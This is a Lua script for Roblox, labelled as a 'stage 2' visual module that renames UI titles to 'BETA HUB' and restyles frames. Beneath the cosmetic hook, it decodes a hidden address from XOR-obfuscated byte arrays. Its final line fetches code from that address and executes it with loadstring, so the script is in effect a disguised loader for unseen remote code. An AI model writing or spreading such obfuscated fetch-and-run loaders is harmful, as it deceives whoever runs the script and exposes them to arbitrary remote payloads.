
--[[ STAGE 2: VISUAL CORE ]]
local _fjFZ4TsnRbWnwrASxz = bit32 and bit32.bxor
if not _fjFZ4TsnRbWnwrASxz then
    _fjFZ4TsnRbWnwrASxz = function(a, b)
        local r, m = 0, 1
        while a > 0 or b > 0 do
            local aa = a % 2
            local bb = b % 2
            if aa ~= bb then r = r + m end
            a = (a - aa) / 2
            b = (b - bb) / 2
            m = m * 2
        end
        return r
    end
end
local function jQI9QXtfolO1g1o(data, a, b, m, s, r)
    local out = {}
    for i = 1, #data do
        local v = data[i]
        local step = (b + i * s) % 256
        if m == 0 then
            v = (v - step) % 256
            v = _fjFZ4TsnRbWnwrASxz(v, a)
        else
            v = _fjFZ4TsnRbWnwrASxz(v, a)
            v = (v - step) % 256
        end
        out[i] = string.char(v)
    end
    local res = table.concat(out)
    if r then
        res = string.reverse(res)
    end
    return res
end
local mGhtBBYVt_JawToLx = {
  {{23, 14, 26, 14, 5}, 63, 183, 1, 3, false, 6},
  {{244, 250, 173, 240, 151}, 185, 222, 1, 3, false, 16},
  {{203, 222, 219, 239, 244}, 224, 68, 0, 6, true, 15},
  {{100, 105, 98, 120, 110, 129}, 97, 73, 0, 7, false, 5},
  {{247, 238, 227, 181, 159, 168}, 89, 122, 1, 4, true, 20},
  {{70, 64, 116, 97, 66}, 110, 184, 1, 1, false, 18},
  {{41, 43, 239, 48, 53, 44, 250}, 128, 55, 1, 3, true, 7},
  {{76, 76, 61, 38}, 242, 87, 1, 2, true, 19},
  {{129, 55, 142}, 200, 128, 0, 7, false, 21},
  {{161, 154, 172, 167}, 151, 196, 0, 7, true, 14},
  {{207, 254, 255}, 148, 230, 1, 6, false, 11},
  {{100, 38, 65, 49}, 201, 121, 0, 4, false, 22},
  {{163, 159, 176, 173}, 146, 162, 0, 5, false, 8},
  {{58, 61, 73, 65}, 38, 225, 0, 7, false, 4},
  {{190, 204, 193, 222, 207, 6, 229}, 207, 26, 0, 2, false, 9},
  {{155, 213, 215, 222, 225, 248}, 17, 109, 0, 3, true, 1},
  {{54, 50, 53, 57, 45, 57}, 190, 18, 1, 3, true, 12},
  {{19, 27, 8}, 157, 32, 1, 2, true, 10},
  {{47, 19, 216}, 241, 171, 1, 4, false, 2},
  {{181, 178, 124, 200, 185}, 130, 199, 0, 3, true, 3},
  {{30, 35, 43}, 245, 131, 0, 4, true, 17},
  {{18, 210, 40, 210, 219, 4, 44}, 213, 150, 1, 2, false, 13}
}
local GU2AjPzo9nM5F6GAq = {}
for dcwG7k1OqnjbQfk0erDRQ = 1, #mGhtBBYVt_JawToLx do
    local pEzCT82SH32gbsZO = mGhtBBYVt_JawToLx[dcwG7k1OqnjbQfk0erDRQ]
    GU2AjPzo9nM5F6GAq[pEzCT82SH32gbsZO[7]] = jQI9QXtfolO1g1o(pEzCT82SH32gbsZO[1], pEzCT82SH32gbsZO[2], pEzCT82SH32gbsZO[3], pEzCT82SH32gbsZO[4], pEzCT82SH32gbsZO[5], pEzCT82SH32gbsZO[6])
end
local g5MnNSiqiEFdeFhE = table.concat(GU2AjPzo9nM5F6GAq)
local HubName = "BETA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(g5MnNSiqiEFdeFhE))()
